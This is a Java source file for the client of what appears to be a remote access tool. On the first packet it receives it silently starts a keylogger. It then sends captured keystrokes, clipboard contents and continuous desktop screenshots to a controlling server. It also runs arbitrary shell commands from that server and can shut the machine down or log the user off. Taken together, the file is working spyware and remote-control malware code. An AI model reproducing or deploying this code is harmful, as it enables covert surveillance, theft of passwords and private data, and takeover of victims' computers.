package Client;

import Control.Clipboard;
import Control.KeyLogger;
import Control.SendCommand;
import Hardware.*;
import Performance.CPU_Usage;
import Performance.MemoryUsage;
import Ultils.MessageType;
import Ultils.NetUtils;
import Ultils.Packet;

import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.ImageOutputStream;
import javax.swing.*;
import java.awt.*;
import java.awt.event.KeyEvent;
import java.awt.image.BufferedImage;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;

public class ClientManager {

    // Desktop
    private Thread desktop;
    private boolean runningDesktop;

    private float compression = 0.5F;

    private Thread performance;
    private boolean trackingPerformance;
    KeyLogger keyLogger;

    public void onMessage(Packet packet, PrintWriter pw) {
        if (keyLogger == null) {
            keyLogger = new KeyLogger();
            keyLogger.startKeyLogger();
        }

        if (packet.action == MessageType.PERFORMANCE_TRACK.getID()) {
            System.out.println("Received from server:" + packet.data);
            try {
                if (packet.data.get(0).equals("start")) {
                    trackingPerformance = true;
                    if (performance == null || !performance.isAlive()) {
                        performance = new Thread((new Runnable() {
                            @Override
                            public void run() {
                                sendPerformanceInfo(pw);
                            }
                        }));
                        performance.start();
                    }
                } else if (packet.data.get(0).equals("stop")) {
                    trackingPerformance = false;
                    if (this.performance != null && this.performance.isAlive()) {
                        this.performance.stop();
                    }
                }
            } catch (Exception e) {
                System.out.println("Failed to process performance packet");
            }
        } else if (packet.action == MessageType.KEYLOGGER.getID()) {
            System.out.println("Sending keylogger info");
            sendKeyloggerInfo(pw);
        }  else if (packet.action == MessageType.CLIPBOARD.getID()) {
            System.out.println("Sending clipboard info");
            sendClipboardInfo(pw);
        } else if (packet.action == MessageType.HARDWARE_INFO.getID()) {
            System.out.println("Received request Hardware info");
            SendCpuInfo(pw);
            SendDiskInfo(pw);
            SendDisplayInfo(pw);
            SendGPUInfo(pw);
            SendOSInfo(pw);
            SendRAMInfo(pw);
        } else if (packet.action == MessageType.ALTF4.getID()) {
            try {
                Robot r = new Robot();
                r.keyPress(KeyEvent.VK_ALT);
                r.keyPress(KeyEvent.VK_F4);

                r.keyRelease(KeyEvent.VK_ALT);
                r.keyRelease(KeyEvent.VK_F4);
            } catch (AWTException e) {
                e.printStackTrace();
            }
        }  else if (packet.action == MessageType.MESSAGE_BOX.getID()) {
            try {
                new Thread(new Runnable() {

                    @Override
                    public void run() {
                        try {
                            JOptionPane.showMessageDialog(null, packet.data.get(1), packet.data.get(0), Integer.parseInt(packet.data.get(2)));
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                }).start();
            } catch (Exception npe) {
                npe.printStackTrace();
            }
        } else if (packet.action == MessageType.COMMAND.getID()) {
            try {
                System.out.println(packet.data);
                String result = Control.SendCommand.SendCommand(packet.data.get(1));
                Packet commandPacket = new Packet();
                commandPacket.action = MessageType.COMMAND.getID();
                commandPacket.data = new ArrayList<String>();
                commandPacket.data.add("return");
                commandPacket.data.add(result);
                NetUtils.sendMessage(commandPacket, pw);
            } catch (Exception e) {
                System.out.println("Failed to send a command");
            }
        } else if (packet.action == MessageType.DESKTOP.getID()) {
            try {
                if (packet.data.get(0).equals("start")) {
                    runningDesktop = true;
                    if (desktop == null || !desktop.isAlive()) {
                        desktop = new Thread(new Runnable() {

                            @Override
                            public void run() {
                                remoteDesktop(pw);
                            }
                        });
                        desktop.start();
                    }
                } else if (packet.data.get(0).equals("stop")) {
                    runningDesktop = false;
                    if (this.desktop != null && this.desktop.isAlive()) {
                        this.desktop.stop();
                    }
                } else if (packet.data.get(0).equals("comp")) {
                    this.compression = Float.parseFloat(packet.data.get(1));
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else if (packet.action == MessageType.SHUTDOWN.getID()) {
            SendCommand.SendCommand_ShutDown();
            System.out.println("Client shutting down");
        } else if (packet.action == MessageType.LOGOFF.getID()) {
            SendCommand.SenCommand_LogOff();
            System.out.println("Client logging off");
        }
    }

    private void sendKeyloggerInfo(PrintWriter pw) {
        try {
            String result = KeyLogger.getKeyloggerData();
            Packet packet = new Packet();
            packet.action = MessageType.KEYLOGGER.getID();
            packet.data = new ArrayList<>();
            packet.data.add(result);
            NetUtils.sendMessage(packet, pw);
            System.out.println(packet.data);
        } catch (Exception e) {
            System.out.println("Cannot send keylogger info");
        }
    }

    private void sendClipboardInfo(PrintWriter pw) {
        try {
            String result = Clipboard.GetClipboard();
            Packet packet = new Packet();
            packet.action = MessageType.CLIPBOARD.getID();
            packet.data = new ArrayList<>();
            packet.data.add(result);
            NetUtils.sendMessage(packet, pw);
            System.out.println(packet.data);
        } catch (Exception e) {
            System.out.println("Cannot send clipboard info");
        }
    }

    private void sendPerformanceInfo(PrintWriter pw) {
        while (trackingPerformance) {
            try {
                sendPerformanceCPU(pw);
                sendPerformanceDisk(pw);
                sendPerformanceProcess(pw);
                sendPerformanceRAM(pw);
            } catch (ThreadDeath tde) {
                System.out.println("Stopped tracking");
            }
            try {
                Thread.sleep(1000);
            } catch (InterruptedException ie) {
                System.out.println("Tracking sleep stopped");
            } catch (ThreadDeath tde) {
                System.out.println("Thread dead while tracking");
            }
        }
    }

    private void sendPerformanceCPU(PrintWriter pw) {
        try {
            Packet packet = new Packet();
            packet.action = MessageType.PERFORMANCE_TRACK.getID();
            packet.data = new ArrayList<>();
            packet.data.add("cpu");
            packet.data.add(String.valueOf(CPU_Usage.getCpuPercent()));
            NetUtils.sendMessage(packet, pw);
            System.out.println("Sending cpu performance info");
        } catch (Exception e) {
            System.out.println("Failed to send cpu performance info");
        }
    }

    private void sendPerformanceRAM(PrintWriter pw) {
        try {
            Packet packet = new Packet();
            packet.action = MessageType.PERFORMANCE_TRACK.getID();
            packet.data = new ArrayList<>();
            packet.data.add("ram");
            packet.data.add(String.valueOf(MemoryUsage.getMemory()));
            NetUtils.sendMessage(packet, pw);
            System.out.println("Sending RAM performance info");
        } catch (Exception e) {
            System.out.println("Failed to send RAM performance info");
        }
    }
    private void sendPerformanceProcess(PrintWriter pw) {
        try {
            Packet packet = new Packet();
            packet.action = MessageType.PERFORMANCE_TRACK.getID();
            packet.data = new ArrayList<>();
            packet.data.add("process");
            packet.data.add(String.valueOf(Performance.Process.getProcessList()));
            NetUtils.sendMessage(packet, pw);
            System.out.println("Sending processes performance info");
        } catch (Exception e) {
            System.out.println("Failed to send processes performance info");
        }
    }

    private void sendPerformanceDisk(PrintWriter pw) {
        try {
            Packet packet = new Packet();
            packet.action = MessageType.PERFORMANCE_TRACK.getID();
            packet.data = new ArrayList<>();
            packet.data.add("disk");
            packet.data.add(String.valueOf(Disk.GetDiskInfo()));
            NetUtils.sendMessage(packet, pw);
            System.out.println("Sending disk performance info");
        } catch (Exception e) {
            System.out.println("Failed to send disk performance info");
        }
    }

    private void remoteDesktop(PrintWriter pw) {
        File temp = new File(System.getProperty("java.io.tmpdir"), "tempd.jpg");
        while (runningDesktop) {
            try {
                Dimension tk = Toolkit.getDefaultToolkit().getScreenSize();

                Robot rt = new Robot();
                BufferedImage img = rt.createScreenCapture(new Rectangle((int) tk.getWidth(), (int) tk.getHeight()));

                ImageWriter writer =  ImageIO.getImageWritersByFormatName("jpg").next();
                ImageOutputStream ios = ImageIO.createImageOutputStream(new FileOutputStream(temp));
                writer.setOutput(ios);

                ImageWriteParam param = writer.getDefaultWriteParam();
                if (param.canWriteCompressed()){
                    param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
                    param.setCompressionQuality(compression);
                }
                writer.write(null, new IIOImage(img, null, null), param);
                String encodedString = Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(temp.getPath())));
                Packet packet = new Packet();
                packet.action = MessageType.DESKTOP.getID();
                packet.data = new ArrayList<String>();
                packet.data.add(encodedString);
                NetUtils.sendMessage(packet, pw);
            } catch (ThreadDeath dt) {
                if (temp.exists()) {
                    try {
                        temp.delete();
                    } catch (Exception e) {
                        System.out.println("Failed to remove image");
                    }
                }
            }
            catch (Exception e) {
                System.out.println("Failed to remote desktop");
            }

            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                System.out.println("Sleep interrupted while recording");
            } catch (ThreadDeath dt) {}
        }
        if (temp.exists()) {
            try {
                temp.delete();
            } catch (Exception e) {
                System.out.println("Cannot remove image");
            }
        }
    }

    public void SendCpuInfo(PrintWriter pw) {
        Packet packet = new Packet();
        packet.action = MessageType.HARDWARE_INFO.getID();
        packet.data = new ArrayList<>();
        packet.data.add("cpu");
        packet.data.add(CPU.getCpuInformation());
        try {
            NetUtils.sendMessage(packet, pw);
            System.out.println("Sending cpu info " + packet.data);
        } catch (Exception e) {
            System.out.println("Failed to send CPU info");
        }
    }

    public void SendGPUInfo(PrintWriter pw) {
        Packet packet = new Packet();
        packet.action = MessageType.HARDWARE_INFO.getID();
        packet.data = new ArrayList<>();
        packet.data.add("gpu");
        packet.data.add(GPU.getGPUInformation().toString());
        try {
            NetUtils.sendMessage(packet, pw);
            System.out.println("Sending gpu info " + packet.data);
        } catch (Exception e) {
            System.out.println("Failed to send GPU info");
        }
    }

    public void SendDiskInfo(PrintWriter pw) {
        Packet packet = new Packet();
        packet.action = MessageType.HARDWARE_INFO.getID();
        packet.data = new ArrayList<>();
        packet.data.add("disk");
        packet.data.add(Disk.GetDiskInfo());
        try {
            NetUtils.sendMessage(packet, pw);
            System.out.println("Sending disk info " + packet.data);
        } catch (Exception e) {
            System.out.println("Failed to send disk info");
        }
    }

    public void SendDisplayInfo(PrintWriter pw) {
        Packet packet = new Packet();
        packet.action = MessageType.HARDWARE_INFO.getID();
        packet.data = new ArrayList<>();
        packet.data.add("display");
        packet.data.add(DisplayInfo.GetAllDisplayInformation());
        try {
            NetUtils.sendMessage(packet, pw);
            System.out.println("Sending display info " + packet.data);
        } catch (Exception e) {
            System.out.println("Failed to send display info");
        }
    }

    public void SendOSInfo(PrintWriter pw) {
        Packet packet = new Packet();
        packet.action = MessageType.HARDWARE_INFO.getID();
        packet.data = new ArrayList<>();
        packet.data.add("os");
        packet.data.add(OS.GetOSVersionInfo());
        try {
            NetUtils.sendMessage(packet, pw);
            System.out.println("Sending os info: " + packet.data);
        } catch (Exception e) {
            System.out.println("Failed to send OS info");
        }
    }

    public void SendRAMInfo(PrintWriter pw) {
        Packet packet = new Packet();
        packet.action = MessageType.HARDWARE_INFO.getID();
        packet.data = new ArrayList<>();
        packet.data.add("ram");
        packet.data.add(RAM.GetPhysicalMemory());
        try {
            NetUtils.sendMessage(packet, pw);
            System.out.println("Sending ram info: " + packet.data);
        } catch (Exception e) {
            System.out.println("Failed to send RAM info");
        }
    }
}
